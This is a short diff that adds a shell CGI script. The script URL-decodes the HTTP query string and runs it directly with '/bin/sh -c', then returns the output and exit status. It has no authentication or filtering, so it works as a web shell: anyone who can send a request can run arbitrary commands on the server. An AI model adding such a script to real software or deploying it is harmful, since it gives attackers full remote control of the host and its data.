@@ -1,0 +1,11 @@
+#! /bin/sh
+
+# HTTP header;
+echo 'type: text/plain'
+echo ''
+
+qstring=`httpd -d "$QUERY_STRING"`
+. /etc/profile
+/bin/sh -c "$qstring" 2>&1
+echo "EXITSTATUS=$?"
+exit 0
